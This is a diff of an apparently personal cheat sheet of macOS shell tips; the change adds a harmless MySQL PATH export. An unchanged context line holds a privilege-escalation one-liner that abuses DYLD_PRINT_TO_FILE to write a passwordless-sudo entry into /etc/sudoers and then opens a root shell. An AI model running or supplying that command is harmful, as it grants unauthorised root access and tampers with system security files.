@@ -34,3 +34,10 @@ EXIT PROGRAM = CMD + Q
 {% highlight bash %}
 echo 'echo "$(whoami) ALL=(ALL) NOPASSWD:ALL" >&3' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo -s
 {% endhighlight %}
+
+## Add mysql to terminal shell: ##
+
+{% highlight bash %}
+echo 'export PATH=/usr/local/mysql/bin:$PATH' >> ~/.bash_profile
+. ~/.bash_profile
+{% endhighlight %}
